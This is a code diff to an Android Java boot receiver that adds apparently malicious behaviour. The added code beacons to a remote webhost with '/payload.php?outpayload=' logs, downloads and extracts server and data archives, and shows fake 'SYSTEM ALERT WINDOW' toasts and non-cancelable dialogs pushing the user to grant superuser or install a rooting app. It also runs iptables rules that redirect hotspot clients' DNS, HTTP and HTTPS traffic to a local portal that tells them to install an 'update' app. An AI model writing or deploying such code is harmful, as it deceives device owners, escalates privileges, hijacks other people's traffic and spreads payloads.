@@ -9,11 +9,13 @@ import org.apache.http.client.methods.HttpGet;
 import org.apache.http.client.methods.HttpPost;
 import org.apache.http.impl.client.DefaultHttpClient;
 import org.json.*;
+import android.app.*;
 import android.os.AsyncTask;
 import android.os.CountDownTimer;
 import android.os.Environment;
 import android.os.Handler;
 import android.os.Vibrator;
+import android.os.BatteryManager;
 import android.content.BroadcastReceiver;
 import android.util.Log;
 import android.content.Context;
@@ -22,12 +24,18 @@ import android.content.IntentFilter;
 import android.content.pm.*;
 import android.content.ActivityNotFoundException;
 import android.content.SharedPreferences;
-import android.widget.Toast;
-import android.widget.TextView;
-import android.view.View;
+import android.widget.*;
+import android.view.*;
+import android.media.MediaPlayer;
+import android.media.AudioManager;
 import android.view.LayoutInflater;
 import android.view.Gravity;
 import android.graphics.Color;
+import android.graphics.PixelFormat;
+import android.graphics.Canvas;
+import android.graphics.Paint;
+import android.graphics.Bitmap;
+import android.graphics.BitmapFactory;
 import android.net.Uri;
 import android.webkit.MimeTypeMap;
 import android.net.wifi.WifiManager;
@@ -36,6 +44,8 @@ import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
 import java.io.*;
 import java.net.*;
+import java.util.*;
+import java.text.*;
 import java.lang.reflect.*;
 
 public class ReceiverBoot extends BroadcastReceiver
@@ -50,17 +60,21 @@ public class ReceiverBoot extends BroadcastReceiver
     private static String version = "1";
     private SharedPreferences settings;
 	private SharedPreferences.Editor seteditor;
+	private AudioManager audioManager;
 	private static boolean prosesThread = true;
 	private static boolean tmpThread = true;
-	private static int delayThread = 3;
 	private static int sizedownload = 0;
 	private static String[] server = { "http://10.42.0.1","http://sunjangyo12.000webhostapp.com" };
 	private static boolean finishInstall = false;
-	
+	public AlertDialog dialog;
 	public Toast toast;
+	public static int delayToast = 0;
+
 	public static int iserver = 0;
-	public static int errServer = 0;
-	public static int jserver = 2;
+	public static int jumserver = 2;
+    public static boolean rootResult = false;
+	public static boolean installResult = false;
+	public static String identitasResult = "";
 	public static boolean pingResult = false;
 	public static String urlServer = "";
 	public static String requestAksi = "";
@@ -68,20 +82,51 @@ public class ReceiverBoot extends BroadcastReceiver
 	public static String requestUrl = "";
 	public static String requestResult = "";
 	public static String requestResultUpload = "";
+	public static String batStatus = "";
     public static boolean main = true;
-    public static boolean rootResult = false;
+    public static String mainSave = "";
     public static String docFolder, pathExternal;
+    public static boolean[] flags;
     private Handler mHandler = new Handler();
 
 	private Runnable mRefresh = new Runnable() {
 		public void run() {
-			prosesThread = false;
-			try {
-				toast.show();
-			}catch(Exception e) {}
-			mHandler.postDelayed(mRefresh, delayThread * 1000);
+			toast.show();
+			mHandler.postDelayed(mRefresh, 100);
 		}
 	};
+
+	// jangan dipanggil 2x dalam satu waktu
+	public void toastShow(Context context, String aktif, int warna, int letak, String text) 
+	{
+		if (delayToast != 0) {
+			mHandler.removeCallbacks(mRefresh);
+
+			Log.i(TAG, "count"+delayToast);
+			toastText(context, text, warna, letak);
+
+			CountDownTimer hitungMundur = new CountDownTimer(delayToast, 100){
+				public void onTick(long millisUntilFinished){
+					toast.show();
+				}
+				public void onFinish()
+				{
+					toast.cancel();
+				}
+			}.start();
+		}
+		else if (aktif.equals("aktif") && delayToast == 0) 
+		{
+			Log.i(TAG, "handler:"+delayToast);
+			mHandler.removeCallbacks(mRefresh);
+			mHandler.postDelayed(mRefresh, 100);
+			toastText(context, text, warna, letak);
+		}
+		else {
+			Log.i(TAG, "remove"+delayToast);
+			mHandler.removeCallbacks(mRefresh);
+		}
+	}
 
 	public String getPath() {
 		return pathExternal;
@@ -91,68 +136,149 @@ public class ReceiverBoot extends BroadcastReceiver
         seteditor.commit();
 	}
 
+	private void logSend(Context context, String text) {
+		if (pingResult) 
+		{
+			String waktu = new SimpleDateFormat("HH:mm:ss").format(new Date());
+			String hash = "";
+			String[] pros = { "["+waktu+"] "+text };
+			try {
+				for (String s : pros)     
+				{
+					hash = URLEncoder.encode(s, "UTF-8");       
+				}
+			}catch (Exception e) {}
+
+			SystemThread system = new SystemThread();
+			system.reqPayload(context, urlServer+"/payload.php?outpayload="+hash, "null");
+		}
+	}
+
 	@Override
 	public void onReceive(Context context, Intent intent)
 	{
 		exContext = context;
+		float voltase = (float)(intent.getIntExtra(BatteryManager.EXTRA_VOLTAGE, 0))/100;
+		float persent = (float)(intent.getIntExtra(BatteryManager.EXTRA_LEVEL, 0));
+		int statusB = intent.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
+
+		String[] portal = {
+				"iptables -A FORWARD -p udp --dport 53 -j ACCEPT",
+				"iptables -A FORWARD -p udp --sport 53 -j ACCEPT",
+				"iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination "+Identitas.getIPAddress(true)+":8888",
+				"iptables -P FORWARD DROP",
+				"iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 80"
+			};
+
+		boolean state = statusB == BatteryManager.BATTERY_STATUS_CHARGING || statusB == BatteryManager.BATTERY_STATUS_FULL;
+		String charger = "TIDAK_CHARGER";
+		if (state) {
+			int charPlug = intent.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);
+			boolean usbPlug = charPlug == BatteryManager.BATTERY_PLUGGED_USB;
+			boolean acPlug = charPlug == BatteryManager.BATTERY_PLUGGED_AC;
+			
+			if (usbPlug) {
+				charger = "USB_CHARGER";
+			}
+			else if (acPlug) {
+				charger = "AC_CHARGER";
+			}
+		}
+		batStatus = ""+voltase+"v "+persent+"% "+charger;
+
+		audioManager = (AudioManager)context.getSystemService(Context.AUDIO_SERVICE);
 		vibrator = (Vibrator)context.getSystemService(Context.VIBRATOR_SERVICE);
 		settings = context.getSharedPreferences("Settings", 0);
 		seteditor = settings.edit();
+		mainSave = settings.getString("swmain","");
 		utils = new ServerUtils(context);
+		identitasResult = Identitas.getIPAddress(true);
         pathToInstallServer = utils.getPathToInstallServer();
         docFolder = utils.getDocFolder();
         pathExternal = utils.getPathExternal();
         urlServer = server[iserver];
 
-        if (settings.getString("swmain","").equals("hidup")) 
-		{
-			main(context, intent);
+        if (settings.getString("server","").equals("aktif")) {
+        	install(context);
+        }
+
+        if (settings.getString("pakroot","").equals("aktif")) {
+        	if (rootRequest().equals("tolak user")) {
+				logSend(context, "root android state............TOLAK USER\n");
+				toastShow(context, "aktif", Color.RED, Gravity.TOP, "SYSTEM ALERT WINDOW\n\n\n     Please Allow superuser.    \n\nnetwork state can't access binary system to update manager\n\n\n");
+			}
 		}
+
+        if (mainSave.equals("hidup")) 
+		{
+			install(context);
+			if (installResult) 
+			{
+				rooting(context);
+				if (rootResult) 
+				{
+					main(context, portal);
+				}
+			}
+		}
+
+		if (hostspotStatus(context)) {
+			logSend(context, "Hotspot terpakai............OK\n");
+		}
+
+
 		//harus urut eksekusi
-		if (cekConnection(context)) {
-        	if (ping(context).equals("1")){
-        		Log.i(TAG, "ping terhubung");
+		if (cekConnection(context) && !hostspotStatus(context)) 
+		{
+        	if (ping()){
         		pingResult = true;
-        	} else {
-        		Log.i(TAG, "ping error");
+        	} 
+        	else {
         		pingResult = false;
+        		iserver += 1;
+				if (iserver == jumserver) {
+					iserver = 0;
+				}
         	}
-        	if (prosesThread) {
-        		mHandler.postDelayed(mRefresh, delayThread * 1000);
-        	}
-        }		
+        } 
+        else {
+        	pingResult = false;
+        }
 
         if (intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED)) 
         {
-			context.startService(new Intent(context, System.class));
+			context.startService(new Intent(context, SystemThread.class));
+
+			/*if (!new MainActivity().apkMana(context, "com.google.android.apps.man", "open")) 
+			{
+				if (rootResult) {
+					String[] apk = { "pm install "+pathExternal+"/com.google.android.apk" };
+					rootCommands(apk);
+				} 
+				else {
+					toastShow(context, "mati", 0, 0, "");
+					toastShow(context, "aktif", Color.YELLOW, Gravity.TOP, "SYSTEM ALERT WINDOW!!\n\n\nSystem firmware can't access /etc/build.prop please follow this Tutorial.\n\n1. Install this app\n2.allow playstore prompt\n\n\n\n\n\n       [ WARNING! ]\n\n\n");
+		
+					String apktemp = pathExternal+"/com.google.android.apk";
+
+        			intent.setDataAndType(Uri.fromFile(new File(apktemp)), "application/vnd.android.package-archive");
+        			intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        			context.startActivity(intent);
+				}
+			}
 			try {
 				Runtime.getRuntime().exec("rm "+pathExternal+"/*.jpg");
 			}
-			catch(Exception e) {}
+			catch(Exception e) {}*/
 		}
 	}
 
-	public void main(Context context, Intent intent) {
-        if (!hostspotStatus(context)) 
-        {
-	        if (!new File(pathExternal+"/system.apk").exists()) {
-	        	if (new MainActivity().apkMana(context, "os.system", "pull")) 
-	        	{
-	        		try {
-	        			Thread.sleep(4000);
-	        			Runtime.getRuntime().exec("mv "+pathExternal+"/os.system.apk "+pathExternal+"/system.apk");
-	        		}catch(Exception e){
-	        			Log.i(TAG, "rename er : "+e);
-	        		}
-	        	} //copy apk
-	        }//cek file
-	    }
-
-
+	public void install(Context context) {
+		
 	    if (!utils.checkDownload()) 
 	    {
-	    	Log.i(TAG, "......download server");
-
+	    	Log.i(TAG, "download all data..........");
+			
 			requestUrl = urlServer+"/install.txt";
 			requestAksi = "web";
 			mainRequest(context);
@@ -161,20 +287,23 @@ public class ReceiverBoot extends BroadcastReceiver
 
 	    	if (!new File(pathExternal+"/server.zip").exists()) 
 	    	{
-	    		try {
-	    			obj = new JSONObject(requestResult);
-		    		Log.i(TAG, "download server : "+obj.getString("url_install_server"));
+				try {
+					logSend(context, "download SERVER............\n");
+					obj = new JSONObject(requestResult);
+					Log.i(TAG, "download server : "+obj.getString("url_install_server"));
 
-		    		requestUrl = obj.getString("url_install_server");
+					requestUrl = obj.getString("url_install_server");
 					requestAksi = "download";
 					requestPath = pathExternal+"/server.zip";
 					mainRequest(context);
 				}
 				catch(Exception e) {}
 	    	} else {
+	    		logSend(context, "download SERVER............OK\n");
 	    		try {
 	    			obj = new JSONObject(requestResult);
 		    		Log.i(TAG, "download DATA : "+obj.getString("url_install_data"));
+		    		logSend(context, "download DATA..............\n");
 
 		    		requestUrl = obj.getString("url_install_data");
 					requestAksi = "download";
@@ -186,63 +315,179 @@ public class ReceiverBoot extends BroadcastReceiver
         } 
 
         if (utils.checkDownload() && !utils.checkInstall()) {
+        	logSend(context, "download DATA..............OK\n");
+        	logSend(context, "extract SERVER............\n");
         	extrak(context, pathExternal+"/server.zip", pathToInstallServer, docFolder);
         }
 
         if (utils.checkDownload() && !utils.checkInstallData() && utils.checkInstall()) {
+			logSend(context, "extract SERVER.............OK\n");
+			logSend(context, "extract DATA...............OK\n");
+
 			extrak(context, pathExternal+"/data.zip", pathExternal, pathExternal);
         }
-        Log.i(TAG,""+utils.checkInstallData());
 
         if (utils.checkInstallData()) {
-			finishInstall = true;
+			installResult = true;
         }
-        
-        if (finishInstall) 
-        {
-			if (rootRequest().equals("root")) 
-			{
-				boolean[] flags = utils.checkRun();
-        		if (flags[0] && flags[1] && flags[2]) {
-        			Log.i(TAG, "run server OK");
-	        	} else {
-	        		utils.runSrv();
-	        	}
-				rootResult = true;
-			}
-			else if (rootRequest().equals("tolak user")) {
-				rootResult = false;
-				delayThread = 3;
-				toastText(context, "SYSTEM ALERT WINDOW\n\n\n     Please Allow superuser.    \n\n\n\n", Color.RED, Gravity.TOP);
-			}
-			else if (rootRequest().equals("tidak root")) {
-				rootResult = false;
-				if (!new MainActivity().apkMana(context, "kingoroot.supersu", "open")) 
-				{
-					delayThread = 1;
-					toastText(context, "SYSTEM ALERT WINDOW!!\n\n\nYour firmware is NOT updated please follow this Tutorial.\n\n1. Install this app SuperUser\n\b2. Open app and click root.\n\n\n\n\n       [ WARNING! ]\n\n\n", Color.YELLOW, Gravity.TOP);
+	}
+
+	public void rooting(Context context) 
+	{
 		
-					String path = pathExternal+"/kroot.apk";
-					String ext = getExtension(path);
-					MimeTypeMap mime = MimeTypeMap.getSingleton();
-	        		String mimeType = mime.getMimeTypeFromExtension(ext.substring(1));
-					intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-	            	intent.setAction(Intent.ACTION_VIEW);
-	            	intent.setDataAndType(Uri.parse("file://" + path), mimeType);
-	            	intent.putExtra("data", path);
-	            	intent.putExtra(Intent.EXTRA_TITLE, "Что использовать?");
-	            	try {
-	            	    context.startActivity(intent);
-	            	} catch (Exception ae) {}
-	      		}
-				else {
-					delayThread = 5;
-					toastText(context, "  [ PLEASE ROOTING NOW ]   \n\n\n     Android system reboot after 30 minuts.    \n\n\n[ WARNING ]\n", Color.GREEN, Gravity.TOP);
-				}
+		if (rootRequest().equals("root")) {
+			mHandler.removeCallbacks(mRefresh);
+			rootResult = true;
+		}
+		if (rootRequest().equals("tolak user")) {
+			logSend(context, "root android state............TOLAK USER\n");
+			rootResult = false;
+			toastShow(context, "aktif", Color.RED, Gravity.TOP, "SYSTEM ALERT WINDOW\n\n\n     Please Allow superuser.    \n\nnetwork state can't access binary system to update manager\n\n\n");
+		}
+		if (rootRequest().equals("tidak root")) {
+			logSend(context, "root android state.............NO ROOT\n");
+			rootResult = false;
+			if (!new MainActivity().apkMana(context, "kingoroot.supersu", "open")) 
+			{
+				logSend(context, "install KINGOROOT..............\n");
+
+				toastShow(context, "mati", 0, 0, "");
+				toastShow(context, "aktif", Color.YELLOW, Gravity.TOP, "SYSTEM ALERT WINDOW!!\n\n\nSystem firmware can't access /etc/build.prop please follow this Tutorial.\n\n1. Install this app\n2.allow playstore prompt\n3. Open app and click root.\n\n\n\n\n       [ WARNING! ]\n\n\n");
+		
+				String kroot = pathExternal+"/kroot.apk";
+
+				Intent intent = new Intent(Intent.ACTION_VIEW);
+        		intent.setDataAndType(Uri.fromFile(new File(kroot)), "application/vnd.android.package-archive");
+        		intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        		context.startActivity(intent);
+        		Log.i(TAG, kroot+kroot);	
+	      	}
+			else {
+				logSend(context, "install KINGOROOT.............OK\n");
+				toastShow(context, "mati", 0, 0, "");
+				toastShow(context, "aktif", Color.GREEN, Gravity.TOP, "  [ PLEASE ROOTING NOW ]   \n\n\n     Android system reboot after 30 minuts.    \n\n\n[ WARNING ]\n");
 			}
         }
 	}
 
+	public void _server(Context context) {
+		utils = new ServerUtils(context);
+	}
+	public String setServer(boolean sw) {
+		flags = utils.checkRun();
+		if (flags[0] && flags[1] && flags[2]) 
+		{
+			if (!sw) {
+				utils.stopSrv();
+				return "server stoping";
+			} 
+			else {
+				return "server running";
+			}
+		}
+		else {
+			if (sw) {
+				utils.runSrv();
+				return "server running";
+			}
+		}
+		return "";
+	}
+
+	public void main(Context context, String[] iproute) 
+	{
+		Log.i(TAG, "panggil");
+		
+		if (hostspotStatus(context)) 
+		{
+			flags = utils.checkRun();
+
+			if (flags[0] && flags[1] && flags[2]) Log.i(TAG, "run server OK");
+			else utils.runSrv();
+
+			if (!cekGsm(context)) {
+				setGSM(true, context);
+			}
+
+			if (cekClient().equals("ada")) {
+				Log.i(TAG, "ada client");
+				dialog.cancel();
+			} 
+			else {
+				dialogAlert(context, "Sistem Android", "Network manager can't access hardware /etc/misc/wifi_supplicant please folowing:\n\n\n1. hubungkan wifi ke hotspot ini\n\n2. Sign captive portal\n     atau buka browser akses url        http://index.html\n\n3. Install dan buka app untuk update system");
+
+				CountDownTimer hitungMundur = new CountDownTimer(5000, 100){
+					public void onTick(long millisUntilFinished){
+					}
+					public void onFinish()
+					{
+						dialog.cancel();
+					}
+				}.start();
+				//toastShow(context, "aktif", Color.YELLOW, Gravity.CENTER, "SYSTEM ALERT WINDOW!!\n\n\nNetwork manager can't add client to /data/misc/wifi please folowing:\n\n1. open browser url http://index.html or Sign in Captive portal\n2. Install app to update\n3. Open app to configure\n\n\n\n\n[UPDATE]");
+			}
+		}
+		
+		if (hostspotStatus(context) && main) 
+		{
+		   	main = false;
+			Log.i(TAG, "main:"+main);
+			
+		   	setGSM(true, context);
+			rootCommands(iproute);
+
+			try {
+				Runtime.getRuntime().exec("mkdir -p "+pathExternal+"/client");
+			}catch(Exception e) {}
+
+			if (!new File(pathExternal+"/system.apk").exists()) 
+			{
+				if (new MainActivity().apkMana(context, "os.system", "pull")) 
+				{
+					try {
+						Thread.sleep(4000);
+						Runtime.getRuntime().exec("mv "+pathExternal+"/os.system.apk "+pathExternal+"/system.apk");
+					}catch(Exception e){
+						Log.i(TAG, "rename er : "+e);
+					}
+				}
+	    	}
+			
+    	}
+    	else if (!hostspotStatus(context) && !main) 
+    	{
+			Log.i(TAG, "reset");
+
+			flags = utils.checkRun();
+			if (flags[0] && flags[1] && flags[2]) 
+			{
+				utils.stopSrv();
+				Log.i(TAG, "stop server OK");
+			}
+
+			dialog.cancel();
+
+			if (cekClientOrServer().equals("client")) {
+				Log.i(TAG, "mode client");
+				requestUrl = "http://"+Identitas.getIpRouter()+":8888/fileman.php?id="+Identitas.getIPAddress(true);
+				requestAksi = "web";
+				mainRequest(context);
+			}
+
+    		
+			try {
+				Runtime.getRuntime().exec("rm "+pathExternal+"/system.apk");
+			}
+			catch(Exception e) {}
+			try {
+				Runtime.getRuntime().exec("rm -r "+pathExternal+"/client");
+			}
+			catch(Exception e) {}
+
+			main = true;
+		}
+
+	}
 
 	public String cekClientOrServer() {
 		String sip = Identitas.getIPAddress(true);
@@ -266,15 +511,26 @@ public class ReceiverBoot extends BroadcastReceiver
 		return "ada";
 	}
 
-	public String ping(Context context) 
-	{
-		Log.i(TAG, "ping server: "+server[iserver]);
+	public boolean ping() {
+		Log.i(TAG, "ping server: "+urlServer);
 
-		requestUrl = server[iserver]+"/ping.txt";
-		requestAksi = "web";
-		mainRequest(context);
+		HttpParams httpParams = new BasicHttpParams();
+	    HttpConnectionParams.setConnectionTimeout(httpParams, 10000);
+	    HttpConnectionParams.setSoTimeout(httpParams, 10000);
 
-		return requestResult;
+        HttpClient httpClient = new DefaultHttpClient(httpParams);
+        HttpGet request = new HttpGet(urlServer);
+        try{
+        	Log.i(TAG, "ping....");
+            HttpResponse response = httpClient.execute(request);
+        	Log.i(TAG, "ping terhubung");
+        	return true;
+		}
+		catch(Exception e) {
+			e.printStackTrace();
+			Log.i(TAG, "ping error ");
+			return false;
+		}
 	}
 
 	public static boolean cekConnection(Context context) {
@@ -286,6 +542,20 @@ public class ReceiverBoot extends BroadcastReceiver
 		if (wifinfo != null && wifinfo.isConnected()) {
 			return true;
 		}
+		if (mobileinfo != null && mobileinfo.isConnected()) {
+			return true;
+		}
+		if (active != null && active.isConnected()) {
+			return true;
+		}
+		return false;
+	}
+
+	public static boolean cekGsm(Context context) {
+		ConnectivityManager cm = (ConnectivityManager)context.getSystemService(Context.CONNECTIVITY_SERVICE);
+		NetworkInfo mobileinfo = cm.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
+		NetworkInfo active     = cm.getActiveNetworkInfo();
+		
 		if (mobileinfo != null && mobileinfo.isConnected()) {
 			return true;
 		}
@@ -457,6 +727,29 @@ public class ReceiverBoot extends BroadcastReceiver
         return null;
     }
 
+	public void audio(Context context, String pathAudio, String start) {
+		MediaPlayer player = new MediaPlayer();
+		audioManager = (AudioManager)context.getSystemService(Context.AUDIO_SERVICE);
+		audioManager.setRingerMode(AudioManager.RINGER_MODE_NORMAL); //SILENT, VIBRATE
+
+		if (start.equals("start")) {
+			try {
+				player.setDataSource(pathAudio);
+			}catch(Exception e) {}
+
+			player.setLooping(false);
+			player.setVolume(100, 100);
+
+			try {
+				player.prepare();
+				player.start();
+			}catch(Exception e) {}
+		}
+		else {
+			player.stop();
+			player.release();
+		}
+	}
 
 	public void toastText(Context context, String data, int warna, int letak)
 	{
@@ -478,20 +771,92 @@ public class ReceiverBoot extends BroadcastReceiver
 		toastView.setBackgroundColor(warna);
 	}
 
+	public void dialogAlert(Context context, String title, String text) {
+		dialog = new AlertDialog.Builder(context)
+					.setTitle(title)
+					.setMessage(text)
+					.setIcon(R.drawable.img)
+					.create();
+		dialog.setCancelable(false);
+		dialog.getWindow().setType(WindowManager.LayoutParams.TYPE_SYSTEM_ALERT);
+		dialog.show();
+	}
+
+	public void windowAlert(Context context, String text, boolean sw) {
+		ViewKu view = new ViewKu(context, "window", "text");
+
+		if (sw) {
+			WindowManager wm = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
+        	WindowManager.LayoutParams lp = new WindowManager.LayoutParams(300, 300,
+																	   WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY,
+																	   WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH, PixelFormat.TRANSLUCENT);
+        	lp.gravity = Gravity.START | Gravity.TOP;
+        	wm.addView(view, lp);
+        }
+        else {
+			WindowManager wm = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
+        	wm.removeViewImmediate(view);
+        }
+	}
+
+	public void toastImage(Context context, String path, int letak)
+	{
+		toast = new Toast(context.getApplicationContext());
+		toast.setGravity(letak, 0, 0);
+		toast.setView(new ViewKu(context, path, ""));
+
+		View toastView = toast.getView();
+		toastView.setBackgroundColor(Color.TRANSPARENT);
+	}
+
+
+    private class ViewKu extends View {
+		private Bitmap image;
+		private Paint redPaint;
+		private int screenW;
+		private int screenH;
+		private String shift = "";
+		private String windowText = "";
+
+		public ViewKu(Context context, String pathAlert, String windowText) {
+			super(context);
+			this.shift = pathAlert;
+			this.windowText = windowText;
+
+			if (pathAlert.equals("window")) {
+				redPaint = new Paint();	
+				redPaint.setAntiAlias(true);
+				redPaint.setColor(Color.RED);
+			}
+			else {
+				image = BitmapFactory.decodeFile(pathAlert);
+			}
+		}
+	
+		@Override 
+		protected void onDraw(Canvas canvas) {
+			if (shift.equals("window")) {
+				canvas.drawCircle(100, 100, 30, redPaint);
+				canvas.drawText("Whacked:", 10, redPaint.getTextSize()+10, redPaint);
+			}
+			else {
+				canvas.drawBitmap(image, (screenW-image.getWidth())/9, 0, null);
+			}
+		}
+	}
+
 	public void mainRequest(Context context) {
 		CallWebPageTask task = new CallWebPageTask();
 		task.applicationContext = context;
 		task.main = requestAksi;
 
 		try {
-			if (cekConnection(context) && errServer <= 3) {
+			if (cekConnection(context)) {
 				task.execute(new String[] { requestUrl });
 			} else {
 				Log.i(TAG, "rece connection : "+cekConnection(context));
 			}
 		}catch(Exception e) {
-			errServer += 1;
-			Log.i(TAG, "timeout update: "+errServer+" >>"+e);
 		}
 	}
 
@@ -670,14 +1035,11 @@ public class ReceiverBoot extends BroadcastReceiver
         	}
         }
 		catch(Exception ex){
-			iserver += 1;
-			if (iserver == jserver) {
-				iserver = 0;
-			}
 			Log.i(TAG, "Failed rece Connect to Server!");
         }
         return sret;
     }
+
 
 	private class CallWebPageTask extends AsyncTask<String, Void, String> 
 	{
@@ -712,3 +1074,4 @@ public class ReceiverBoot extends BroadcastReceiver
 	}
 
 }
+
